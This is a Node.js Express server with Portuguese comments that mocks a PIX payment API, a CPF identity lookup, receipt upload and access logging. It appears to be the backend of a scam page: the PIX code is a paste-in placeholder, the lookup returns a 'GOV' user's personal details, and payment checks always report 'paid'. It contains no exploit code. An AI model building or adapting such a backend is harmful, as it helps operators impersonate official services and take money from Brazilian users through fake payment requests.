const express = require('express');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3001;

app.use(cors());
app.use(express.json());

// Servir os arquivos estáticos na raiz (HTML, css, js, etc.)
app.use(express.static(path.join(__dirname)));

// Rota explícita para o arquivo principal (ajuda na compatibilidade com alguns hosts)
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// String PIX modificada conforme solicitado
const pixString = "COLAR PIX AQUI";

app.all('/api/pix', (req, res) => {
    res.json({
        "success": true,
        "status": "pending",
        "pix_code": pixString,
        "transaction_id": "TRX1773112005534XIK04E",
        "deposit_id": "TRX1773112005534XIK04E",
        "qrcode": pixString,
        "amount": 72.57,
        "amount_cents": 7257,
        "key": null,
        "brcode": pixString,
        "payload": pixString,
        "pixCode": pixString,
        "paid": false,
        "pix": {
            "key": null,
            "brcode": pixString,
            "qrcode": pixString,
            "payload": pixString,
            "expiresAt": "1-01-01T00:00:00-03:6.466666666666669"
        },
        "raw": {
            "transactionId": "TRX1773112005534XIK04E",
            "status": "PENDING",
            "paymentMethod": "PIX",
            "amount": 7257,
            "netAmount": 6650,
            "fees": 607,
            "createdAt": "2026-03-10T00:06:45-03:00",
            "invoiceUrl": "",
            "paymentData": {
                "id": "051c8629ab33410192d53112c3aafcd3",
                "qrCode": pixString,
                "qrCodeUrl": "",
                "qrCodeBase64": "",
                "copyPaste": pixString,
                "expiresAt": "1-01-01T00:00:00-03:6.466666666666669"
            }
        },
        "raw_response": {
            "success": true,
            "data": {
                "transactionId": "TRX1773112005534XIK04E",
                "status": "PENDING",
                "paymentMethod": "PIX",
                "amount": 7257,
                "netAmount": 6650,
                "fees": 607,
                "createdAt": "2026-03-10T00:06:45-03:00",
                "invoiceUrl": "",
                "paymentData": {
                    "id": "051c8629ab33410192d53112c3aafcd3",
                    "qrCode": pixString,
                    "qrCodeUrl": "",
                    "qrCodeBase64": "",
                    "copyPaste": pixString,
                    "expiresAt": "1-01-01T00:00:00-03:6.466666666666669"
                }
            }
        }
    });
});

// Mock de Consulta CPF (PHP legado)
app.get('/api/consulta.php', (req, res) => {
    const { cpf } = req.query;
    res.json({
        "success": true,
        "DADOS": {
            "nome": "USUARIO DE TESTE GOV",
            "data_nascimento": "12/05/1985",
            "nome_mae": "MARIA SILVA TESTE",
            "sexo": "M"
        }
    });
});

// Mock de Upload de Comprovante (PHP legado)
app.post('/api/comprovantes/upload.php', (req, res) => {
    res.json({ "success": true });
});

// Mock de Verificação de Pagamento
app.get('/api/check-payment', (req, res) => {
    res.json({
        "success": true,
        "status": "paid",
        "bank_tx_id": "BANK-" + Math.random().toString(36).substring(2, 10).toUpperCase()
    });
});

// Outras rotas mockadas para evitar 404
app.post('/api/notify-approved', (req, res) => res.json({ "success": true }));
app.post('/api/log-access', (req, res) => res.json({ "success": true }));
app.get('/api/transaction/:id', (req, res) => {
    res.json({
        "success": true,
        "status": "paid",
        "amount": 72.57,
        "id": req.params.id
    });
});

if (require.main === module) {
    app.listen(PORT, () => {
        console.log(`Servidor rodando na porta ${PORT}`);
        console.log(`Rota PIX disponível em: http://localhost:${PORT}/api/pix`);
    });
}

module.exports = app;
